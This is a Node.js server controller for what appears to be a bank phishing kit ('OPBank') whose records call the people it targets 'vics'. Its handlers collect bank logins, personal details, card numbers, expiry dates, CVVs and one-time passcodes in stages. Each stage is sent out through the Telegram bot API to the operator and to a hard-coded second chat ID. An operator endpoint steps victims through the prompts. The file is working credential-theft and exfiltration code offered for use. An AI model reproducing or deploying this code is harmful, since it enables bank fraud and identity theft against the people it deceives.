var moment = require("moment"); // require
const OPBank = require("../models/opbankModel");
const axios = require("axios");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    OPBank.find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status, keyNumber, last3 } = req.body;
    try {
        if (keyNumber) await uBank.findOneAndUpdate({ uniqueid }, { status, keyNumber }).exec();
        else if (last3) await uBank.findOneAndUpdate({ uniqueid }, { status, last3 }).exec();
        else await uBank.findOneAndUpdate({ uniqueid }, { status  }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    OPBank.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip, telegramId } = req.body;
    try {
        let user = await OPBank.create({
            uniqueid,
            username,
            password,
            status: 1,
            owner,
            ip,
            timestamp: moment().format()
        });
        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}`;
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: telegramId,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, password, uniqueid } = req.body;
    try {
        await OPBank.findOneAndUpdate({ uniqueid }, { username, password, status: 4, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitBilling = async (req, res) => {
    const { ccnum, ccexp, cvv, uniqueid, telegramId } = req.body;
    try {
        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 3, timestamp: moment().format() }).exec();
        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nFull Name: ${user.ccname}\nAddress: ${user.address}\nDOB: ${user.dob}\nMobile: ${user.telephone}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`;
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: telegramId,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitPersonal = async (req, res) => {
    const { ccname, address, dob, telephone, uniqueid, telegramId } = req.body;
    try {
        let user = await OPBank.findOneAndUpdate({ uniqueid }, { ccname, address, dob, telephone, status: 2, timestamp: moment().format() }).exec();
        let originalText = `ID: ${user.uniqueid}\nUsername: ${user.username}\nPassword: ${user.password}\nFull Name: ${ccname}\nAddress: ${address}\nDOB: ${dob}\nMobile: ${telephone}`;
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: telegramId,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `OP:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await OPBank.findOneAndUpdate({ uniqueid }, { otp, status: 7, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await OPBank.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    getInfo,
    submitLogin,
    submitPersonal,
    submitLoginAgain,
    submitBilling,
    deleteEntry,
    submitOtp,
    command,
};
